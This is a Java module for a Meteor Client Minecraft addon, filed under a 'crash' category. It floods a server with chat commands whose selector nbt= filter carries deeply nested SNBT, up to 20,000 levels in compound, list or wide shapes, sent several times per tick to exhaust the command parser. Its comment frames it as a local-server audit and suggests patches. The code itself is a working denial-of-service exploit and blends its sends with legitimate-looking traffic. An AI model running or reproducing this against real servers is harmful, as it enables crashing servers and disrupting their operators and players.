package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;

/**
 * AUDIT: SNBT Depth (command-parser recursion)
 *
 * Sends a command whose argument carries a deeply-nested SNBT compound
 * ({a:{a:{a:...}}}) via a selector's nbt= filter. This stresses the COMMAND
 * parser's recursion/size limits - a different surface from item NBT (see
 * nbt-bomb). A parser that recurses without a depth cap can blow the stack or
 * spend excessive CPU before any permission check even runs.
 *
 * The command template is configurable; {n} is replaced with the nested SNBT.
 *
 * Patch signal: cap SNBT/JSON nesting depth and total size during command
 * parsing, parse defensively (iteratively or with a bounded depth), and run
 * cheap permission/rate gating before expensive argument parsing.
 *
 * Run against your OWN local server only.
 */
public class SnbtDepth extends Module {
    public enum Shape { COMPOUND, LIST, WIDE }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
    private final Setting<String> command = sgGeneral.add(new StringSetting.Builder()
        .name("command").description("Command template; {n} = nested SNBT. No leading slash.")
        .defaultValue("execute if entity @e[nbt={n}] run tp @s ~ ~ ~")
        .build()
    );
    private final Setting<Shape> shape = sgGeneral.add(new EnumSetting.Builder<Shape>()
        .name("shape")
        .description("COMPOUND = {a:{a:1}}; LIST = [[[1]]] (separate parser path); WIDE = many sibling keys × depth.")
        .defaultValue(Shape.COMPOUND).build()
    );
    private final Setting<Integer> depth = sgGeneral.add(new IntSetting.Builder()
        .name("depth").description("SNBT nesting levels.")
        .defaultValue(800).range(1, 20000).sliderRange(1, 4000).build()
    );
    private final Setting<Integer> width = sgGeneral.add(new IntSetting.Builder()
        .name("width").description("Sibling keys per level (WIDE shape).")
        .defaultValue(32).range(1, 1024).sliderRange(1, 256)
        .visible(() -> shape.get() == Shape.WIDE).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("commands-per-tick").description("Commands sent each tick.")
        .defaultValue(5).range(1, 200).sliderRange(1, 50).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );
    private int ticksActive = 0, packetsSent = 0;

    public SnbtDepth() {
        super(AddonTemplate.CRASH_CATEGORY, "snbt-depth",
            "Sends commands with deeply-nested SNBT (compound / list / wide) in a selector. Tests command-parser recursion/size limits.");
    }

    private String buildNested() {
        int levels = depth.get();
        return switch (shape.get()) {
            case COMPOUND -> wrap(levels, "{a:", "}", "1");
            case LIST -> wrap(levels, "[", "]", "1");
            case WIDE -> {
                // root with `width` keys, each a compound nested `levels` deep
                StringBuilder sb = new StringBuilder("{");
                String inner = wrap(levels, "{a:", "}", "1");
                for (int w = 0; w < width.get(); w++) {
                    if (w > 0) sb.append(',');
                    sb.append('k').append(w).append(':').append(inner);
                }
                yield sb.append('}').toString();
            }
        };
    }

    private static String wrap(int levels, String open, String close, String core) {
        StringBuilder sb = new StringBuilder(levels * (open.length() + close.length()) + core.length());
        for (int i = 0; i < levels; i++) sb.append(open);
        sb.append(core);
        for (int i = 0; i < levels; i++) sb.append(close);
        return sb.toString();
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;
        String cmd = command.get().replace("{n}", buildNested());
        for (int i = 0; i < perTick.get(); i++) {
            mc.player.networkHandler.sendChatCommand(cmd);
            packetsSent++;
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
